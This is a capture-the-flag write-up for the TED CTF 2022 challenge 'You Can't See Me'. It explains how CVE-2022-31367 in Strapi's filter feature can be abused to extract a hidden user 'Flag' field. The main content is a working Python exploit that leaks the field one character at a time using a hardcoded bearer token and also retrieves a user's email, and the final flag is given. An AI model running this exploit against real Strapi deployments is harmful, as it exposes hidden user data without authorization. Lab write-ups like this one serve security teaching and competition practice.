# You Can't See Me - TED CTF 2022 

Given access to Strapi dashboard


![img](https://raw.githubusercontent.com/kos0ng/ctf-writeups/master/solver/2022/tedctf/Pasted%20image%2020221110122039.png)


We try to check each data on dashboard and there is "User" tab in dashoard. Take a look on one of the user we can see that there is suspicous column which is "Flag"

![img](https://raw.githubusercontent.com/kos0ng/ctf-writeups/master/solver/2022/tedctf/Pasted%20image%2020221110122327.png)

Flag is hidden, given user can't view the hidden data. By using [CVE-2022-31367](https://github.com/kos0ng/CVEs/tree/main/CVE-2022-31367) unauthorized user can abuse the filter feature to get the value of the Flag. Here is the solver to get the flag.
```python
import requests
import json
import string
import urllib.parse

r = requests.session()
url = "http://103.250.10.221:8000/content-manager/collection-types/plugins::users-permissions.user?page=1&pageSize=10&_sort=username:ASC&_where[0][flag_containss]={}"
auth = {"Authorization":"Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwiaWF0IjoxNjY4MDU4MzIyLCJleHAiOjE2NzA2NTAzMjJ9.3z8fxPaec8wj_vCDHAWJztPbpXKMfx-4DPTQPxkngjU"}
leak_flag = ""
poss_char = string.printable[:-6].replace("%","")
while True:
	print("Leak : " + leak_flag)
	known_len = len(leak_flag)
	for i in poss_char:
		safe_string = urllib.parse.quote_plus(leak_flag+i)
		tmp_url = url.format(safe_string)
		data = json.loads(r.get(tmp_url,headers = auth).text)
		if(len(data['results']) > 0 ):
			leak_flag += i
			break
	if(known_len==len(leak_flag)):
		break
while True:
	print("Leak : " + leak_flag)
	known_len = len(leak_flag)
	for i in poss_char:
		safe_string = urllib.parse.quote_plus(i+leak_flag)
		tmp_url = url.format(safe_string)
		data = json.loads(r.get(tmp_url,headers = auth).text)
		if(len(data['results']) > 0 ):
			email = data['results'][0]['email']
			leak_flag = i + leak_flag
			break
	if(known_len==len(leak_flag)):
		break
print("Email : " + email)
print("Flag : " + leak_flag)
```

![img](https://raw.githubusercontent.com/kos0ng/ctf-writeups/master/solver/2022/tedctf/Pasted%20image%2020221110123525.png)
![img](https://raw.githubusercontent.com/kos0ng/ctf-writeups/master/solver/2022/tedctf/Pasted%20image%2020221110123727.png)

After that just change the format to flag format and got the flag

**Flag  : CTFTED2022{cve-2022-31367-should_be_easy_for_you}**
